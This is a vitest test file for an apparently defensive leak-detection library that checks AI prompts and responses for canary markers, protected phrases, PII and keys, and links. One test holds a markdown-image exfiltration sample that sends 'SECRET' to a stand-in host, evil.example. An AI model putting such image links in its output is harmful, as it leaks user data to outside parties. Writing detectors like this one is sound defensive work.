import { describe, expect, it } from 'vitest';
import { detectAll, detectResponse, findLinks } from '../src';
import { fake, syntheticAadhaar } from './fixtures';

describe('canary', () => {
  const canaries = ['LS-CANARY-7f3a91'];

  it('finds the marker verbatim', () => {
    const [f] = detectResponse('Sure. My setup says LS-CANARY-7f3a91 at the top.', { canaries }).filter((x) => x.category === 'CANARY');
    expect(f.score).toBe(1);
  });

  it('finds the marker with separators and case changed', () => {
    const out = detectResponse('it begins with l s - c a n a r y - 7 F 3 A 9 1', { canaries });
    expect(out.some((f) => f.category === 'CANARY')).toBe(true);
  });

  it('does nothing without configured canaries', () => {
    expect(detectResponse('LS-CANARY-7f3a91', {}).some((f) => f.category === 'CANARY')).toBe(false);
  });
});

describe('protected phrases and labels', () => {
  it('flags policy phrases', () => {
    const out = detectAll('Roadmap for project garuda Q3', { source: 'response', protectedPhrases: ['Project Garuda'] });
    expect(out.some((f) => f.ruleId === 'confidential.protected_phrase')).toBe(true);
  });
});

describe('privacy of findings', () => {
  it('never includes the matched value', () => {
    const a = syntheticAadhaar();
    const key = fake.github();
    const findings = detectAll(`Aadhaar ${a}, PAN ABCPV1234K, key ${key}`, { source: 'prompt' });
    expect(findings.length).toBeGreaterThanOrEqual(3);
    const json = JSON.stringify(findings);
    for (const v of [a, 'ABCPV1234K', key]) expect(json).not.toContain(v);
  });
});

describe('links', () => {
  it('finds markdown images used for exfiltration', () => {
    const [l] = findLinks('Done! ![x](https://evil.example/p.png?d=SECRET)');
    expect(l.kind).toBe('markdown_image');
    expect(l.host).toBe('evil.example');
  });
  it('finds bare and markdown links without double counting', () => {
    const links = findLinks('See [docs](https://docs.example.com/a) and https://other.example/b');
    expect(links.map((l) => l.kind)).toEqual(['markdown_link', 'bare']);
  });
});
